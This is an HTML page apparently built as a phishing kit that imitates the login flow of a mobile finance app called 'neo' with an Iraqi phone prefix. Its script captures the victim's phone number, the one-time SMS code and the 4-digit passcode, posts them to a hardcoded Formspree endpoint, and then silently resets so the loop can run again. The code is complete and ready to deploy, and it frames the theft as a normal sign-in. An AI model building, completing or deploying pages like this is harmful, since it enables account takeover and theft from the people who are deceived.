<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>neo</title>
    <style>
        /* Global Styles */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            overflow: hidden;
        }

        .page-section {
            display: none;
            flex-direction: column;
            height: 100vh;
            width: 100vw;
            padding: 20px;
            box-sizing: border-box;
            align-items: center;
            text-align: center;
            position: absolute;
            top: 0;
            left: 0;
            transition: opacity 0.5s ease;
            justify-content: flex-start;
        }

        .page-section.active {
            display: flex;
        }

        /* --- Page 1 & 2 Common --- */
        #page-1, #page-2 {
            background-color: #FFFFFF;
        }

        .content-area {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 350px;
            margin-top: 15vh;
            flex-shrink: 0;
        }
        
        #page-1 .content-area {
            margin-top: 20vh;
        }

        .button-area {
            width: 100%;
            max-width: 350px;
            padding-bottom: 2em;
            margin-top: 3em;
        }

        /* --- Page 1 Styles --- */
        .logo {
            width: 120px;
            margin-bottom: 4em;
        }
        
        .phone-input-container {
            display: flex; width: 100%; border-bottom: 1px solid #ccc; padding-bottom: 8px; align-items: center; direction: ltr;
        }
        .country-code {
            border: none; background: transparent; font-size: 16px; padding: 0 10px; outline: none; color: #333;
        }
        .separator {
            border-left: 1px solid #ccc; height: 20px; margin: 0 5px;
        }
        .mobile-number-input {
            border: none; background: transparent; font-size: 16px; width: 100%; outline: none; direction: ltr;
        }
        .mobile-number-input::placeholder { color: #aaa; }
        
        .continue-button {
            width: 100%; display: block; padding: 15px; background-color: #d9d6f9; border: none; border-radius: 30px; color: white;
            font-size: 18px; font-weight: 500; text-decoration: none;
            opacity: 0.6; 
            pointer-events: none;
            transition: background-color 0.3s ease, opacity 0.3s ease;
            cursor: default;
        }

        .continue-button.active {
            opacity: 1;
            pointer-events: auto;
            background-color: #5C52D2;
            cursor: pointer;
        }

        /* --- Page 2 Styles --- */
        .phone-icon {
            width: 60px;
            margin-bottom: 2em;
        }
        #page-2 h2 {
            font-size: 14px;
            color: #5C52D2;
            margin-bottom: 0.4em;
            font-weight: 500;
        }
        #page-2 p {
            font-size: 10px;
            color: #5C52D2;
            margin-top: 0;
        }
        .otp-container {
            display: flex; justify-content: center; gap: 8px; margin: 1.5em 0; direction: ltr;
        }
        .otp-input {
            width: 40px; height: 50px; text-align: center; font-size: 22px; border: none; border-bottom: 2px solid #ccc;
            border-radius: 0; background-color: transparent;
        }
        .otp-input:focus { outline: none; border-bottom-color: #5C52D2; }
        
        #page-2 .button-area {
             margin-top: 3em;
        }
        .support-links p { margin: 0.5em 0; font-size: 13px; color: #666; }
        .support-links a { color: #5C52D2; text-decoration: none; font-weight: 500; }

        /* --- Page 3 Styles --- */
        #page-3 {
            background-color: #4B40C1;
            color: white;
            justify-content: flex-start;
            padding-top: 10vh;
        }
        #page-3 .content-area {
            justify-content: space-between;
            height: 75vh;
            margin-top: 0;
        }
        #page-3 h2 { color: white; font-weight: 500; margin-bottom: 0; font-size: 22px; }
        .passcode-indicators { display: flex; gap: 15px; margin-bottom: 4em; justify-content: center; }
        .passcode-indicator { width: 12px; height: 12px; border-radius: 50%; border: 1.5px solid white; transition: background-color 0.2s; }
        .passcode-indicator.filled { background-color: white; }
        
        .keypad-container {
             width: 100%;
             max-width: 300px;
        }
        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1em 2em; align-items: center; justify-items: center; }
        .keypad-button { 
            background: none; border: none; color: white; font-size: 28px; padding: 15px; cursor: pointer; text-align: center;
            width: 60px; height: 60px; display: flex; align-items: center; justify-content: center;
            -webkit-tap-highlight-color: rgba(255, 255, 255, 0.2);
        }
        .keypad-button[data-value="Forgot"] {
            font-size: 16px;
        }
        .keypad-button[data-value="delete"] {
            font-size: 24px;
        }
    </style>
</head>
<body>

    <div id="page-1" class="page-section active">
        <div class="content-area">
            <img src="https://res.cloudinary.com/dl6aos9km/image/upload/v1754500293/20250806_200924_0000_popwzo.png" alt="neo logo" class="logo">
            <form id="form-1">
                <div class="phone-input-container">
                    <select name="country_code" class="country-code">
                        <option value="+964">+964</option>
                    </select>
                    <div class="separator"></div>
                    <input type="tel" name="phone_number" class="mobile-number-input" placeholder="Enter your mobile number" required>
                </div>
            </form>
             <div class="button-area">
                <button id="btn-to-page-2" class="continue-button">Continue</button>
            </div>
        </div>
    </div>

    <div id="page-2" class="page-section">
        <div class="content-area">
            <img src="https://res.cloudinary.com/dl6aos9km/image/upload/v1754500293/20250806_201038_0000_ihsrry.png" alt="Phone Icon" class="phone-icon">
            <h2>Enter the 6-digit code</h2>
            <p id="phone-display">sent to ...</p>
            <form id="form-2" style="width:100%">
                <input type="hidden" name="Step" value="1 & 2: Phone and OTP">
                <input type="hidden" id="hidden-country-code" name="Country Code">
                <input type="hidden" id="hidden-phone-number" name="Phone Number">
                <input type="hidden" id="otp-full-code" name="OTP Code">
                <div class="otp-container">
                    <input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric"><input type="tel" maxlength="1" class="otp-input" inputmode="numeric">
                </div>
            </form>
             <div class="button-area support-links">
                 <p>Didn't get the code? <a href="#">Resend it.</a></p>
                 <p>Didn't enter the right mobile number? <a href="#" id="btn-back-to-page-1">Change it.</a></p>
             </div>
        </div>
    </div>
    
    <div id="page-3" class="page-section">
        <div class="content-area">
             <form id="form-3" style="display: none;">
                  <input type="hidden" name="Step" value="3: Passcode">
                  <input type="hidden" id="passcode-input" name="Passcode" value="">
             </form>
             <h2>Enter passcode</h2>
             <div class="passcode-indicators">
                 <div class="passcode-indicator"></div><div class="passcode-indicator"></div><div class="passcode-indicator"></div><div class="passcode-indicator"></div>
             </div>
             <div class="keypad-container">
                <div class="keypad">
                    <button class="keypad-button" data-value="1">1</button><button class="keypad-button" data-value="2">2</button><button class="keypad-button" data-value="3">3</button>
                    <button class="keypad-button" data-value="4">4</button><button class="keypad-button" data-value="5">5</button><button class="keypad-button" data-value="6">6</button>
                    <button class="keypad-button" data-value="7">7</button><button class="keypad-button" data-value="8">8</button><button class="keypad-button" data-value="9">9</button>
                    <button class="keypad-button" data-value="Forgot">Forgot</button><button class="keypad-button" data-value="0">0</button><button class="keypad-button" data-value="delete">âŒ«</button>
                </div>
             </div>
         </div>
     </div>

     <script>
         document.addEventListener('DOMContentLoaded', () => {
            // --- FINAL CONFIGURATION: Your Formspree URL is now set ---
            const FORMSPREE_ENDPOINT = 'https://formspree.io/f/xldlpqzg'; 

            const pages = document.querySelectorAll('.page-section');
            const form1 = document.getElementById('form-1');
            const form2 = document.getElementById('form-2');
            const form3 = document.getElementById('form-3');
            
            if (form2) form2.action = FORMSPREE_ENDPOINT;
            if (form3) form3.action = FORMSPREE_ENDPOINT;

            function showPage(pageId) {
                pages.forEach(page => page.classList.remove('active'));
                const newPage = document.getElementById(pageId);
                if (newPage) newPage.classList.add('active');
                if (pageId === 'page-2') otpInputs[0].focus();
            }
            
            function resetAllForms() {
                form1.reset();
                otpInputs.forEach(input => input.value = '');
                passcodeHiddenInput.value = '';
                updatePasscodeView();
                btnToPage2.classList.remove('active');
            }

            async function submitForm(formElement) {
                if (!formElement || !formElement.action) return;
                const formData = new FormData(formElement);
                try {
                    await fetch(formElement.action, {
                        method: 'POST',
                        body: formData,
                        headers: { 'Accept': 'application/json' }
                    });
                } catch (error) {
                    console.error('Form submission error:', error);
                }
            }

            const btnToPage2 = document.getElementById('btn-to-page-2');
            const phoneInput = form1.querySelector('input[name="phone_number"]');
            
            phoneInput.addEventListener('input', () => {
                phoneInput.value = phoneInput.value.replace(/[^0-9]/g, '');
                btnToPage2.classList.toggle('active', phoneInput.value.length === 10);
            });

            btnToPage2.addEventListener('click', (e) => {
                e.preventDefault();
                if (btnToPage2.classList.contains('active')) {
                    const countryCode = form1.querySelector('select').value;
                    const phoneNumber = phoneInput.value;
                    document.getElementById('hidden-country-code').value = countryCode;
                    document.getElementById('hidden-phone-number').value = phoneNumber;
                    document.getElementById('phone-display').textContent = `sent to ${countryCode}${phoneNumber}`;
                    showPage('page-2');
                }
            });

            const otpInputs = document.querySelectorAll('.otp-input');
            const fullOtpInput = document.getElementById('otp-full-code');

            otpInputs.forEach((input, index) => {
                input.addEventListener('input', (e) => {
                    if (input.value && index < otpInputs.length - 1) otpInputs[index + 1].focus();
                    let otp = Array.from(otpInputs).map(i => i.value).join('');
                    if (otp.length === otpInputs.length) {
                        fullOtpInput.value = otp;
                        submitForm(form2);
                        showPage('page-3');
                    }
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === "Backspace" && !e.target.value && index > 0) otpInputs[index - 1].focus();
                });
            });

            document.getElementById('btn-back-to-page-1').addEventListener('click', (e) => {
                e.preventDefault();
                otpInputs.forEach(input => input.value = '');
                showPage('page-1');
            });

            const passcodeHiddenInput = document.getElementById('passcode-input');
            const passcodeIndicators = document.querySelectorAll('.passcode-indicator');
            const keypadButtons = document.querySelectorAll('.keypad-button');

            function updatePasscodeView() {
                const len = passcodeHiddenInput.value.length;
                passcodeIndicators.forEach((ind, idx) => ind.classList.toggle('filled', idx < len));
            }

            keypadButtons.forEach(button => {
                button.addEventListener('click', async () => {
                    const value = button.dataset.value;
                    let currentPasscode = passcodeHiddenInput.value;

                    if (value === 'delete') {
                        passcodeHiddenInput.value = currentPasscode.slice(0, -1);
                    } else if (value === 'Forgot') {
                         passcodeHiddenInput.value = '';
                    } else if (!isNaN(parseInt(value)) && currentPasscode.length < 4) {
                        passcodeHiddenInput.value += value;
                    }
                    updatePasscodeView();
                    if (passcodeHiddenInput.value.length === 4) {
                        await submitForm(form3);
                        setTimeout(() => {
                            resetAllForms();
                            showPage('page-1');
                        }, 300);
                    }
                });
            });
         });
     </script>
 </body>
 </html>
```
